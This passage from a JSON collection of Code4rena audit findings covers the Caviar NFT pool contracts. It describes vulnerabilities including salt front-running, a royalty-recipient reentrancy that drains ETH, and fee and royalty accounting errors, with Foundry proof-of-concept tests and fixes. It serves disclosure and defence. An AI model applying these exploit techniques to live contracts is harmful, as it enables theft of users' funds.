vm.expectRevert(LibClone.DeploymentFailed.selector);\n        factory.create{value: baseTokenAmount}(\n            baseToken,\n            nft,\n            virtualBaseTokenReserves,\n            virtualNftReserves,\n            changeFee,\n            feeRate,\n            merkleRoot,\n            true,\n            false,\n            bytes32(0),\n            tokenIds,\n            baseTokenAmount\n        );\n    }\n```\n\n## Tools Used\nFoundry\n\n## Recommended Mitigation Steps\nConsider making the upcoming pool address user specific by combining the salt value with user's address.\n```solidity\n    privatePool = PrivatePool(payable(privatePoolImplementation.cloneDeterministic(\n        keccak256(abi.encode(msg.seender, _salt))\n    )));\n```",
      "summary": "\nThis bug report is about an issue with the `Factory.create` function in the code-423n4/2023-04-caviar repository on GitHub. The function is responsible for creating new `PrivatePool`s, and the address of the new PrivatePool depends solely upon the `_salt` parameter provided by the user. This public readability of `_salt` parameter creates two issues. \n\nThe first issue is that if a user intends to create new pool and deposit some funds in it, an attacker can frontrun the user's txns and capture the deposit amounts. The second issue is that if a user intends to create a PrivatePool, their create txn can be forcefully reverted by an attacker by deploying a pool for themselves using the user's salt. This can be repeated again and again resulting in a denial of service for the `Factory.create` function.\n\nThe Foundry tool was used to test these issues. The recommended mitigation step is to make the upcoming pool address user specific by combining the salt value with the user's address.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/419",
      "tags": [],
      "finders": [
        "philogy",
        "yixxas",
        "Dug",
        "ladboy233",
        "0xTheC0der",
        "saian",
        "dingo2077",
        "juancito",
        "hasmama",
        "sashik_eth",
        "GT_Blockchain",
        "adriro",
        "holyhansss_kr",
        "AkshaySrivastav",
        "said",
        "fs0c",
        "hihen",
        "zion",
        "Haipls",
        "bin2chen",
        "carlitox477"
      ]
    },
    {
      "id": "16255",
      "title": "[M-10] Incorrect protocol fee is taken when changing NFTs",
      "impact": "MEDIUM",
      "content": "\nIncorrect protocol fee is taken when changing NFTs which results in profit loss for the Caviar protocol.\n\n### Proof of Concept\n\nThe protocol fee in changeFeeQuote is calculated as a percentage of the feeAmount which is based on the input amount:\n\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L737>\n\n```solidity\nfunction changeFeeQuote(uint256 inputAmount) public view returns (uint256 feeAmount, uint256 protocolFeeAmount) {\n    ...\n    protocolFeeAmount = feeAmount * Factory(factory).protocolFeeRate() / 10_000;\n```\n\nThis seems wrong as in buyQuote and sellQuote the protocol fee is calculated as a percentage of the input amount, not the pool fee amount:\n\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L703>\n\n```solidity\nfunction buyQuote(uint256 outputAmount)\n    ...\n    protocolFeeAmount = inputAmount * Factory(factory).protocolFeeRate() / 10_000;\n```\n\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L721>\n\n```solidity\nfunction sellQuote(uint256 inputAmount)\n    ...\n    protocolFeeAmount = outputAmount * Factory(factory).protocolFeeRate() / 10_000;\n```\n\nThis makes the protocol fee extremely low meaning a profit loss for the protocol.\n\n### Recommended Mitigation Steps\n\n`protocolFeeAmount` in changeFeeQuote should be a percentage of the input amount instead of the pool fee.\n\n**[outdoteth (Caviar) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/463#issuecomment-1518567170):**\n > There is no risk of fund loss here. But agree that this is an issue.\n\n**[outdoteth (Caviar) mitigated](https://github.com/code-423n4/2023-04-caviar-findings/issues/463#issuecomment-1520531536):**\n > Fix is here: https://github.com/outdoteth/caviar-private-pools/pull/13.\n> \n> Proposed fix is to add a separate fee called protocolChangeFeeRate which can be much higher than protocolFeeRate. For example, protocolChangeFeeRate could be on the order of ~20-30%. For example, if the fixed `changeFee` is 0.1 ETH, the NFT is worth 1.5 ETH, and the protocolChangeFeeRate is 30%, then the protocol fee would be 0.03 ETH on a change() or flashLoan().\n> \n> ```solidity\n> function changeFeeQuote(uint256 inputAmount) public view returns (uint256 feeAmount, uint256 protocolFeeAmount) {\n>     // multiply the changeFee to get the fee per NFT (4 decimals of accuracy)\n>     uint256 exponent = baseToken == address(0) ? 18 - 4 : ERC20(baseToken).decimals() - 4;\n>     uint256 feePerNft = changeFee * 10 ** exponent;\n> \n>     feeAmount = inputAmount * feePerNft / 1e18;\n>     protocolFeeAmount = feeAmount * Factory(factory).protocolChangeFeeRate() / 10_000;\n> }\n> ```\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/463#issuecomment-1528971055):**\n > The Warden has shown an inconsistency in how protocolFees are computed, because this is limited to a loss of Yield, I believe Medium Severity to be more appropriate.\n\n**Status:** Mitigation confirmed. Full details in reports from [rbserver](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/23), [KrisApostolov](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/44), and [rvierdiiev](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/13).\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the code for the Caviar protocol which results in an incorrect protocol fee being taken when changing NFTs. This results in a profit loss for the Caviar protocol. The bug is located in the PrivatePool.sol code at line 737. The protocol fee in changeFeeQuote is calculated as a percentage of the feeAmount which is based on the input amount, while in buyQuote and sellQuote the protocol fee is calculated as a percentage of the input amount. To fix the bug, the protocolFeeAmount in changeFeeQuote should be a percentage of the input amount instead of the pool fee. The bug was identified using manual review.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/463",
      "tags": [],
      "finders": [
        "JGcarv",
        "J4de",
        "DishWasher",
        "RaymondFam",
        "CodingNameKiki",
        "Voyvoda",
        "saian",
        "GT_Blockchain",
        "neumo",
        "Josiah"
      ]
    },
    {
      "id": "16254",
      "title": "[M-09] Malicious royalty recipient can steal excess eth from buy orders",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L268>\n\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L140-L143>\n\n### Impact\n\nUsers that submit single or bulk Buy orders through `EthRouter.sol` can have their excess eth stolen by a malicious royalty recipient.\n\n### Proof of Concept\n\n**Introduction**\n\nThe `buy(...)` function in `PrivatePool.sol` refunds excess ether back to `EthRouter.sol` and\nthen pays a royalty amount to a royalty recipient. The order is the following:\n\n```solidity\n// refund any excess ETH to the caller\nif (msg.value > netInputAmount) msg.sender.safeTransferETH(msg.value - netInputAmount);\n```\n\n```solidity\nif (payRoyalties) {\n    ...\nelse {\n    recipient.safeTransferETH(royaltyFee);\n}\n```\n\nThis turns out to be dangerous since now `buy(...)` in `EthRouter.sol` can be reentered from the fallback function of a royalty recipient. In the fallback function the attacker would call `buy` in the `EthRouter.sol` with an empty `Buy[] buys calldata`, `deadline=0` and `payRoyalties = false` which will skip the `for` loop in `buy(...)`, since `buys` is empty, and would reach the following block of code:\n\n```solidity\n// refund any surplus ETH to the caller\nif (address(this).balance > 0) {\n    msg.sender.safeTransferETH(address(this).balance);\n}\n```\n\nSince now `msg.sender` is the royalty recipient he would receive all the ether that is currently residing in `EthRouter.sol` while the original `buy(...)` triggered by the user hasn't yet finished.\n\nBefore supplying a PoC implementation in Foundry, there are a few caveats to be noted.\n\nFirstly, this issue can be more easily reproduced by assuming that the malicious royalty recipient would come either from a single `Buy` order consisting of a single `tokenId` or multiple `Buy` orders where the `tokenId` with the malicious royalty recipient is the last `tokenId` in the array of the last `Buy` order. \n\nIn the case of the `tokenId` associated with the malicious royalty recipient being positioned NOT in last place in the `tokenIds[]` array in the last `Buy` order we would have to write a `fallback` function that after collecting all the ether in `EthRouter.sol` somehow extracts information of how much ether would be needed to successfully complete the rest of the `buy(...)` invocations (that will be called on the rest of the `tokenIds[]`) and sends that ether back to `EthRouter.sol` so that the whole transaction doesn't revert due to `EthRouter.sol` being out of funds. In the presented PoC implementation it is assumed that `tokenIds` has a single token or the malicious royalty recipient is associated with the last `tokenId` in the last `Buy` if there are multiple `Buy` orders. In the case where `tokenId` is positioned not in last place a more sophisticated approach would be needed to steal the excess eth that involves inspecting the `EthRouter.buy(...)` while it resides in the transaction mempool and front-running a transaction that configures a `fallback()` function in the royalty recipient that would send the necessary amount of the stolen excess eth back to `EthRouter.sol` so that `buy(...)` doesn't revert.\n\n**PoC implementation**\n\nSee warden's [original submission](https://github.com/code-423n4/2023-04-caviar-findings/issues/569) for full details.\n\n**Note on severity**\n\nA severity rating of \"High\" was chosen due to the following:\n\n1.  Although the current state of the NFT market mostly has adopted NFTs that have royalty payments directly to the creator, the authors of Caviar have acknowledged the ERC-2981 standard and it is assumed they are aware that `royaltyInfo` returns an arbitrary royalty recipient address.\n\n2.  The PoC implementation in this report uses an already existing NFT project  - Pixels1024 - deployed on the Polygon network that shows a use case where users are responsible for the creation of a given NFT from a collection and therefore the user-creator is assigned as a royalty recipient.\n\n3.  It is possible that future projects adopting ERC-2981 could have novel and complex interactions between who creates and who receives royalties in a given collection, therefore, extra caution should be a priority when handling `royaltyInfo` requests and the current implementation is shown to have  notable vulnerability.\n\n### Tools Used\n1.  Foundry\n2.  ERC-2981 specification - <https://eips.ethereum.org/EIPS/eip-2981>\n3.  1024 Pixels NFT - [repo](https://github.com/michaelliao/1024pixels/blob/master/contracts/1024pixels.sol); [polygon](https://polygonscan.com/address/0x1024accd05fa01adbb74502dbddd8e430d610c53);\n\n### Recommended Mitigation Steps\n\nRework `buy` in `EthRouter.sol` and `PrivatePool.sol`. Use reentrancy guard.\n\n**[outdoteth (Caviar) acknowledged via duplicate issue `#752`](https://github.com/code-423n4/2023-04-caviar-findings/issues/752#issuecomment-1518072836)** \n\n**[Alex the Entreprenerd (judge) decreased severity to Medium](https://github.com/code-423n4/2023-04-caviar-findings/issues/569#issuecomment-1529069612)**\n\n\n\n***\n\n",
      "summary": "\nA bug report has been identified in the code of Caviar, a project that uses ERC-2981. This bug could allow a malicious royalty recipient to steal excess ETH from users that submit single or bulk Buy orders through `EthRouter.sol`. The bug can be reproduced by assuming that the malicious royalty recipient would come either from a single `Buy` order consisting of a single `tokenId` or multiple `Buy` orders where the `tokenId` with the malicious royalty recipient is the last `tokenId` in the array of the last `Buy` order. A proof of concept implementation has been provided and the severity rating of the bug has been rated as high due to the potential of complex interactions between who creates and who receives royalties in a given collection. The tools used to identify the bug were manual inspection, Foundry, the ERC-2981 specification, and the 1024 Pixels NFT. The recommended mitigation steps are to rework `buy` in `EthRouter.sol` and `PrivatePool.sol` and use reentrancy guard.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/569",
      "tags": [
        "Reentrancy"
      ],
      "finders": [
        "philogy",
        "sashik_eth",
        "Ruhum",
        "Voyvoda",
        "0xRobocop",
        "Evo",
        "teawaterwire",
        "Kenshin",
        "giovannidisiena"
      ]
    },
    {
      "id": "16253",
      "title": "[M-08] Loss of funds for traders due to accounting error in royalty calculations",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L237-L281>\n\n<https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L328-L355>\n\n### Impact\n\nThe `PrivatePool.buy` and `PrivatePool.sell` functions intend to distribute royalty amount whenever NFTs are traded. The implementation of buy and sell looks like this:\n\n```solidity\n    function buy(uint256[] calldata tokenIds, uint256[] calldata tokenWeights, MerkleMultiProof calldata proof)\n        public\n        payable\n        returns (uint256 netInputAmount, uint256 feeAmount, uint256 protocolFeeAmount)\n    {\n        // ...\n\n        // calculate the sale price (assume it's the same for each NFT even if weights differ)\n        uint256 salePrice = (netInputAmount - feeAmount - protocolFeeAmount) / tokenIds.length;\n        uint256 royaltyFeeAmount = 0;\n        for (uint256 i = 0; i < tokenIds.length; i++) {\n            // transfer the NFT to the caller\n            ERC721(nft).safeTransferFrom(address(this), msg.sender, tokenIds[i]);\n\n            if (payRoyalties) {\n                // get the royalty fee for the NFT\n                (uint256 royaltyFee,) = _getRoyalty(tokenIds[i], salePrice);\n\n                // add the royalty fee to the total royalty fee amount\n                royaltyFeeAmount += royaltyFee;\n            }\n        }\n\n        // add the royalty fee amount to the net input aount\n        netInputAmount += royaltyFeeAmount;\n\n        // ...\n\n        if (payRoyalties) {\n            for (uint256 i = 0; i < tokenIds.length; i++) {\n                // get the royalty fee for the NFT\n                (uint256 royaltyFee, address recipient) = _getRoyalty(tokenIds[i], salePrice);\n\n                // transfer the royalty fee to the recipient if it's greater than 0\n                if (royaltyFee > 0 && recipient != address(0)) {\n                    if (baseToken != address(0)) {\n                        ERC20(baseToken).safeTransfer(recipient, royaltyFee);\n                    } else {\n                        recipient.safeTransferETH(royaltyFee);\n                    }\n                }\n            }\n        }\n\n        // emit the buy event\n        emit Buy(tokenIds, tokenWeights, netInputAmount, feeAmount, protocolFeeAmount, royaltyFeeAmount);\n    }\n\n    function sell(\n        ...\n    ) public returns (...) {\n        // ...\n\n        uint256 royaltyFeeAmount = 0;\n        for (uint256 i = 0; i < tokenIds.length; i++) {\n            // transfer each nft from the caller\n            ERC721(nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]);\n\n            if (payRoyalties) {\n                // calculate the sale price (assume it's the same for each NFT even if weights differ)\n                uint256 salePrice = (netOutputAmount + feeAmount + protocolFeeAmount) / tokenIds.length;\n\n                // get the royalty fee for the NFT\n                (uint256 royaltyFee, address recipient) = _getRoyalty(tokenIds[i], salePrice);\n\n                // tally the royalty fee amount\n                royaltyFeeAmount += royaltyFee;\n\n                // transfer the royalty fee to the recipient if it's greater than 0\n                if (royaltyFee > 0 && recipient != address(0)) {\n                    if (baseToken != address(0)) {\n                        ERC20(baseToken).safeTransfer(recipient, royaltyFee);\n                    } else {\n                        recipient.safeTransferETH(royaltyFee);\n                    }\n                }\n            }\n        }\n\n        // subtract the royalty fee amount from the net output amount\n        netOutputAmount -= royaltyFeeAmount;\n\n        if (baseToken == address(0)) {\n            // transfer ETH to the caller\n            msg.sender.safeTransferETH(netOutputAmount);\n\n            // if the protocol fee is set then pay the protocol fee\n            if (protocolFeeAmount > 0) factory.safeTransferETH(protocolFeeAmount);\n        } else {\n            // transfer base tokens to the caller\n            ERC20(baseToken).transfer(msg.sender, netOutputAmount);\n\n            // if the protocol fee is set then pay the protocol fee\n            if (protocolFeeAmount > 0) ERC20(baseToken).safeTransfer(address(factory), protocolFeeAmount);\n        }\n\n        // ...\n    }\n```\n\nIt should be noted that while calculating `royaltyFeeAmount` the the `recipient` address returned from `_getRoyalty` function is ignored and the returned `royaltyFee` is added to the `royaltyFeeAmount`. This cumulative royalty amount is then collected from the trader.\n\nHowever while performing the actual royalty transfer to the royalty recipient the returned `recipient` address is validated to not be equal to 0. The royalty is only paid when the `recipient` address is non-zero.\n\nThis inconsistency between royalty collection and royalty distribution can cause loss of funds to the traders. In the cases when `royaltyFee` is non-zero but `recipient` address is zero, the fee will be collected from traders but won't be distributed to royalty recipient. Hence causing loss of funds to the traders.\n\nAs the creation of private pools is open to everyone, the likelihood of this vulnerability is high.\n\n### Proof of Concept\n\nConsider this scenario:\n\n*   A buyer initiates the `buy` call for an NFT.\n*   The `PrivatePool.buy` function queries the `_getRoyalty` function which returns 10 WETH as the `royaltyFee` and `0x00` address as the royalty recipient.\n*   This 10 WETH value will be added to the `royaltyFeeAmount` amount and will be collected from the buyer.\n*   But since the recipient address is `0x00`, the 10 WETH royalty amount will not be distributed.\n*   The 10 WETH amount won't be returned to the buyer either. It just simply stays inside the pool contract.\n*   The buyer here suffered loss of 10 WETH.\n\nA similar scenario is possible for the NFT `sell` flow.\n\n### Recommended Mitigation Steps\n\nConsider collecting royalty amount from traders only when the royalty recipient is non-zero.\n\n```solidity\n    if (royaltyFee > 0 && recipient != address(0)) {\n        royaltyFeeAmount += royaltyFee;\n    }\n```\n\n**[outdoteth (Caviar) confirmed and commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/596#issuecomment-1520049550):**\n > Fixed in: https://github.com/outdoteth/caviar-private-pools/pull/11.\n> \n> Proposed fix is to only increment the total royalty fee amount in sell() and buy() when the recipient address is not zero.\n> \n> In sell():\n> \n> ```solidity\n> // transfer the royalty fee to the recipient if it's greater than 0\n> if (royaltyFee > 0 && recipient != address(0)) {\n>     // tally the royalty fee amount\n>     royaltyFeeAmount += royaltyFee;\n> \n>     if (baseToken != address(0)) {\n>         ERC20(baseToken).safeTransfer(recipient, royaltyFee);\n>     } else {\n>         recipient.safeTransferETH(royaltyFee);\n>     }\n> }\n> ```\n> \n> In buy():\n> \n> ```solidity\n> if (royaltyFee > 0 && recipient != address(0)) {\n>     // add the royalty fee to the total royalty fee amount\n>     royaltyFeeAmount += royaltyFee;\n> }\n> ```\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/596#issuecomment-1527422591):**\n > The Warden has shown how, due to a logic discrepancy, a non-zero royalty would be removed from total paid, but wouldn't be transferred.\n> \n> The behaviour is inconsistent, so the finding is valid.\n> \n> Technically the tokens will be left in the pool, meaning the owner will be able to retrieve them.\n> \n> Factually this would end up being an additional cost to the buyer, more so than a loss of funds.\n> \n> Because the finding shows an inconsistent behavior, that doesn't cause a loss of funds beside the royalty fee, I believe Medium Severity to be the most appropriate.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/596#issuecomment-1534384118):**\n > At this time, with the information that I have available, the finding highlights the fact that the royalties may be paid, but not transferred to the recipient if the recipient is the address(0).\n> \n> While the OZ implementation addresses this, I don't believe older implementations would.\n> \n> I also have to concede that having non-zero royalties sent to address(0) should not be common.\n> \n> However, I maintain that the issue with the finding is not the address(0) per-se which would have been rated as Low, but the fact that in that case the behaviour is inconsistent with other cases, and that will cause a cost to the payer although the royalties will not be forwarded.\n> \n> By contrast, if the royalties were sent to address(0) I would be arguing around the idea that the royalty recipient may wish to burn such tokens and that would have been within their rights to do so.\n> \n> For the reasons above, am maintaining Medium Severity.\n\n**Status:** Mitigation confirmed. Full details in reports from [rbserver](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/30), [KrisApostolov](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/42), and [rvierdiiev](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/12).\n\n\n\n***\n\n",
      "summary": "\nA bug has been found in the PrivatePool.sol code of the 2023-04-caviar repository on GitHub. The `PrivatePool.buy` and `PrivatePool.sell` functions are intended to distribute royalty amount whenever Non-Fungible Tokens (NFTs) are traded. The bug is that while calculating the royalty fee amount, the recipient address returned from the `_getRoyalty` function is ignored and the returned royalty fee is added to the total royalty fee amount. However, while transferring the royalty fee to the recipient, the recipient address is validated to not be equal to zero. This inconsistency between royalty collection and royalty distribution can cause loss of funds to the traders. \n\nA proof of concept has been provided to demonstrate the bug. In the scenario, a buyer initiates the `buy` call for an NFT. The `PrivatePool.buy` function queries the `_getRoyalty` function which returns 10 WETH as the `royaltyFee` and `0x00` address as the royalty recipient. This 10 WETH value is added to the `royaltyFeeAmount` amount and is collected from the buyer. Since the recipient address is `0x00`, the 10 WETH royalty amount will not be distributed and the 10 WETH amount won't be returned to the buyer either. This causes the buyer to suffer a loss of 10 WETH.\n\nA similar scenario is possible for the NFT `sell` flow. \n\nThe recommended mitigation steps for this bug are to consider collecting royalty amount from traders only when the royalty recipient is non-zero. This can be done by adding the following code to the `PrivatePool.buy` and `PrivatePool.sell` functions:\n\n```solidity\n    if (royaltyFee > 0 && recipient != address(0)) {\n        royaltyFeeAmount += royaltyFee;\n    }\n```",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/596",
      "tags": [
        "Royalty"
      ],
      "finders": [
        "rbserver",
        "tallo",
        "bin2chen",
        "sashik_eth",
        "Koolex",
        "bshramin",
        "cryptonue",
        "0xRobocop",
        "saian",
        "chaduke",
        "adriro",
        "rvierdiiev",
        "AkshaySrivastav"
      ]
    },
    {
      "id": "16252",
      "title": "[M-07] Royalty recipients will not get fair share of royalties",
      "impact": "MEDIUM",
      "content": "\nRecipients of NFTs who accept royalties will not get their fair share of royalties. This is because royalties are calculated by dividing the sales price equally amongst all sold NFTs in that purchase. The issue with this is that it assumes all NFTs cost the same amount when it comes time to deal out royalties. If NFTs cost different amounts, then they should be getting an amount of royalties based on that weight relative to the other NFTs. The impact of this is that Royalties will not be distributed evenly at the expense of the more expensive NFT. Meaning that recipients of the expensive NFT will always receive less than they are owed. And the cheaper ones will get more than owed. In short, this is a loss of funds or misdistribution of funds.\n\n### Proof of Concept\n\nThe easiest way to test this will to be add this snippet into Milady.sol.\n\nUsing this to have access to ERC2981's `setRoyaltyInfo()`:\n\n```solidity\nfile: Milady.sol\n    function setRoyaltyInfo(\n        uint256 _royaltyFeeRate,\n        address _royaltyRecipient\n    ) public {\n        royaltyFeeRate = _royaltyFeeRate;\n        royaltyRecipient = _royaltyRecipient;\n    }\n\n    function supportsInterface(\n        bytes4 interfaceId\n    ) public view override(ERC2981, ERC721) returns (bool) {\n        return super.supportsInterface(interfaceId);\n    }\n\n    function royaltyInfo(\n        uint256 id,\n        uint256 salePrice\n    ) public view override returns (address, uint256) {\n        return super.royaltyInfo(id, salePrice);\n    }\n\n    function setRoyaltyInfo(uint256 id, address reciever, uint96 fee) public {\n        super._setTokenRoyalty(id, reciever, fee);\n    }\n}\n\n```\n\nThen add this snippet to Fixture.sol:\n\n```solidity\nfile: Fixture.sol\n\n    GodsUnchained public gu = new GodsUnchained();\n\n```\n\nThen add this snippet to token-weights.json:\n\nChanging the weights to represent the two NFT's being bought in this case.\n\n```json\n[\n  [\n    1,\n    1\n  ],\n  [\n    2,\n    10\n  ]\n]\n```\n\nLastly to test this, you need to add this test to Buy.t.sol:\n\n```solidity\n    // forge test --match-test test_unevenRoyalties --ffi\n    function test_unevenRoyalties() public {\n        // arrange\n        privatePool = new PrivatePool(\n            address(factory),\n            address(royaltyRegistry),\n            address(stolenNftOracle)\n        );\n        privatePool.initialize(\n            baseToken,\n            address(gu),\n            virtualBaseTokenReserves,\n            12e18,\n            changeFee,\n            feeRate,\n            generateMerkleRoot(),\n            true,\n            true\n        );\n        //> owner of nft's\n        address user1 = address(0xbeefbeef);\n        address user2 = address(0xfeebfeeb);\n\n        //> mint and push nft's one is 1x one is 10x\n        gu.mint(address(privatePool), 1);\n        tokenIds.push(1);\n        tokenWeights.push(1e18);\n\n        gu.mint(address(privatePool), 2);\n        tokenIds.push(2);\n        tokenWeights.push(10e18);\n\n        //> set fees. 1% for one user, 10% for the other\n        gu.setRoyaltyInfo(1, user1, 100);\n        gu.setRoyaltyInfo(2, user2, 1000);\n\n        //> set up\n        proofs = generateMerkleProofs(tokenIds, tokenWeights);\n        uint256 weightSum = privatePool.sumWeightsAndValidateProof(\n            tokenIds,\n            tokenWeights,\n            proofs\n        );\n        (uint256 netInputAmount, , ) = privatePool.buyQuote(weightSum);\n\n        //> buy\n        privatePool.buy{value: netInputAmount * 2}( \n            tokenIds,\n            tokenWeights,\n            proofs\n        );\n\n        //> assert that users got equal reserves. with different weights and royalty fees users should NOT be getting the same amount of royalties\n        //> the royalty fee of user2 is 10 times greater than user one. This shows that user2 is getting 10 times as much royaltys when user 2 should be getting 100 times as much as user one.\n        //> user 1: 1% of 1 eth = 0.01 eth\n        //> user 2: 10% of 10 eth = 1 eth\n        //> 0.01 eth * 100 = 1eth.\n        //> user 2 should be getting 100 times more royalties than user 1 but is only getting 10 times the amount.\n        assertEq(user1.balance * 10, address(user2).balance);\n    }\n\n```\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nTo address this issue, it is recommended that the weight of NFTs relative to other NFTs being purchased should be taken into consideration when calculating royalties.\n\n**[outdoteth (Caviar) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/669#issuecomment-1518657766):**\n > It is commented in the code that it's assumed all NFTs in the purchase are of the same price: https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L334\n> \n> Assuming that the recipient is the same for each NFTs royalty payment (which it almost always is in practice), then this makes sense.\n> \n> NFT 1 is worth 1 ETH<br>\n> NFT 2 is worth 2 ETH<\n> \n> (1 + 2) / 2 = 1.5 ETH<br>\n> 1 / 2 + 2 / 2 = 1.5 ETH\n> \n> The output is the same. The additional complexity of individually calculating each price is not worth it.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/669#issuecomment-1529055395):**\n > I believe that the finding is valid because the EIP specifies that each NFT may have a different royalty, the contract is still fetching the specific royalty for each NFT id, leading me to believe that this will cause incorrect royalty payouts in specific cases in which a collection has different royalties based on the NFT id.\n> \n> As a developer, I agree with the Sponsor with a nofix and believe in practice that this should not be an issue.\n>\n> As a Judge, I believe the finding meets the requirements of improperly implementing an EIP, which can cause a loss of yield. For this reason, I think Medium Severity to be appropriate.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a misdistribution of funds when dealing out royalties to recipients of Non-Fungible Tokens (NFTs). The issue is that royalties are currently calculated by dividing the sales price equally amongst all sold NFT's in that purchase, assuming they all cost the same amount. This can lead to the more expensive NFTs receiving less than they are owed, and the cheaper ones getting more than owed. \n\nTo test this bug, the tester added snippets to Milady.sol, Fixture.sol, and token-weights.json, and added a test to Buy.t.sol.\n\nTo address this issue, the tester recommends that the weight of NFTs relative to other NFTs being purchased should be taken into consideration when calculating royalties. This would ensure that recipients of the more expensive NFTs receive the correct amount of royalties.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/669",
      "tags": [
        "ERC2981",
        "NFT",
        "Royalty",
        "Wrong Math"
      ],
      "finders": [
        "J4de",
        "yixxas",
        "Nyx",
        "Dug",
        "savi0ur",
        "MiloTruck",
        "DishWasher",
        "abiih",
        "sashik_eth",
        "Bason",
        "T1MOH",
        "CodingNameKiki",
        "Voyvoda",
        "0xLanterns",
        "aviggiano",
        "adriro",
        "bshramin",
        "AkshaySrivastav",
        "RaymondFam",
        "Ruhum",
        "ElKu",
        "DadeKuma"
      ]
    },
    {
      "id": "16251",
      "title": "[M-06] Flashloan fee is not distributed to the factory",
      "impact": "MEDIUM",
      "content": "\nWhen user takes a flashloan, then [he pays a fee](https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L651) to the PrivatePool.\nThe problem is that the whole fee amount is sent to PrivatePool and factory receives nothing.\n\nHowever, all other function of contract send some part of fees to the factory.\n\nFor example, `change` function, which is similar to the `flashloan` as it doesn't change virtual nft and balance reserves. This function [calculates pool and protocol fees](https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L736-L737).\n\nBut in case of flashloan, only pool receives fees.\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nSend some part of flashloan fee to the factory.\n\n**[outdoteth (Caviar) confirmed and commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/697#issuecomment-1519957289):**\n > Fixed in: https://github.com/outdoteth/caviar-private-pools/pull/8.\n> \n> Proposed fix is to add a method that returns the protocol fee and flash fee. And then have the flash fee function sum the two outputs:\n> \n> ```solidity\n> function flashFeeAndProtocolFee() public view returns (uint256 feeAmount, uint256 protocolFeeAmount) {\n>     // multiply the changeFee to get the fee per NFT (4 decimals of accuracy)\n>     uint256 exponent = baseToken == address(0) ? 18 - 4 : ERC20(baseToken).decimals() - 4;\n>     feeAmount = changeFee * 10 ** exponent;\n>     protocolFeeAmount = feeAmount * Factory(factory).protocolFeeRate() / 10_000;\n> }\n> \n> \n> function flashFee(address, uint256) public view returns (uint256) {\n>     (uint256 feeAmount, uint256 protocolFeeAmount) = flashFeeAndProtocolFee();\n>     return feeAmount + protocolFeeAmount;\n> }\n> ```\n> \n> and then add the protocol payment in the flashLoan method:\n> \n> ```solidity\n> // -- snip -- //\n> \n> if (baseToken != address(0)) {\n>     // transfer the fee from the borrower\n>     ERC20(baseToken).safeTransferFrom(msg.sender, address(this), flashFee);\n> \n>     // transfer the protocol fee to the factory\n>     ERC20(baseToken).safeTransferFrom(msg.sender, factory, protocolFee);\n> } else {\n>     // transfer the protocol fee to the factory\n>     factory.safeTransferETH(protocolFee);\n> }\n> ```\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/697#issuecomment-1528972275):**\n > @outdoteth - Can you please confirm if you originally intended to have the protocol charge a fee for Flashloans?\n\n**[outdoteth (Caviar) commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/697#issuecomment-1530128568):**\n > It was an oversight that we did not charge fees on flash loans. It's implied that it should be paid though since protocol fees are charged everywhere else a user makes a transaction.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/697#issuecomment-1531011905):**\n > The Warden has found an inconsistency as to 